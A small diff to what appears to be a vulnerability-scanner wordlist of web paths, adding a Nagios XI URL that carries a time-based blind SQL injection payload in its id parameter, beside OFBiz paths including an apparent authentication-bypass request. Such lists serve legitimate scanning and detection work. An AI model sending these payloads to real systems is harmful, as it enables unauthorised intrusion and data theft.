@@ -9930,3 +9930,4 @@ a
 /partymgr/control/getJSONuiLabelArray
 /partymgr/control/getJSONuiLabel
 /webtools/control/ProgramExport;/?USERNAME&PASSWORD&requirePasswordChange=Y
+/nagiosxi/index.php/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=(SELECT+CASE+WHEN+1=1+THEN+sleep(5)+ELSE+sleep(0)+END+)
